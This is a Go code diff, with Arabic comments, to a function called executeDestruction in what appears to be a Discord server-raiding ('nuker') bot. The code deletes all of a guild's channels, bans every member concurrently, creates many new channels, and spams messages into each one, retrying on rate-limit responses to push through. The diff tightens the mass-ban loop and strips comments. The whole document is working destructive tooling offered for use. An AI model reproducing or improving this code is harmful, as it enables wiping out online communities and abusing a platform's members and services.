@@ -337,7 +337,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	// 1. حذف الرومات الحالية بالكامل وبشكل متزامن ومضمون
+	// 1. حذف الرومات الحالية
 	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 	if err == nil {
 		for k, v := range headers {
@@ -369,36 +369,33 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}
 
-	// 2. جلب الأعضاء وتبنيدهم بشكل منظم وآمن
+	// 2. تجميع الأعضاء وتبنيدهم عبر الدالة الرسمية للمكتبة لتجنب أي أخطاء
 	go func() {
-		var userIDs []string
 		after := ""
 		for {
 			members, err := s.GuildMembers(guildID, after, 1000)
 			if err != nil || len(members) == 0 {
 				break
 			}
+			
+			var wgBan sync.WaitGroup
 			for _, member := range members {
-				userIDs = append(userIDs, member.User.ID)
+				wgBan.Add(1)
+				go func(userID string) {
+					defer wgBan.Done()
+					s.GuildBanCreate(guildID, userID, 0)
+				}(member.User.ID)
 				after = member.User.ID
 			}
+			wgBan.Wait()
+
 			if len(members) < 1000 {
 				break
 			}
 		}
-
-		var wgBan sync.WaitGroup
-		for _, uID := range userIDs {
-			wgBan.Add(1)
-			go func(userID string) {
-				defer wgBan.Done()
-				s.GuildBanCreate(guildID, userID, 0)
-			}(uID)
-		}
-		wgBan.Wait()
 	}()
 
-	// 3. إنشاء الرومات الجديدة بالعدد المطلوب حرفياً وحفظ آيديهاتها
+	// 3. إنشاء الرومات الجديدة والسبام فيها بالعدد الكامل
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -436,7 +433,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 	}
 	wgCreate.Wait()
 
-	// 4. إرسال الرسائل بالعدد الكامل لكل روم تم إنشاؤه مع معالجة الـ Rate Limit
 	var wgMsg sync.WaitGroup
 	for _, chID := range channelIDs {
 		wgMsg.Add(1)
@@ -458,11 +454,11 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 				if msgResp.StatusCode == 429 {
 					msgResp.Body.Close()
 					time.Sleep(200 * time.Millisecond)
-					m-- // إعادة محاولة نفس الرسالة عند الحظر المؤقت
+					m--
 					continue
 				}
 				msgResp.Body.Close()
-				time.Sleep(15 * time.Millisecond) // تأخير آمن لمنع حظر البوت
+				time.Sleep(15 * time.Millisecond)
 			}
 		}(chID)
 	}
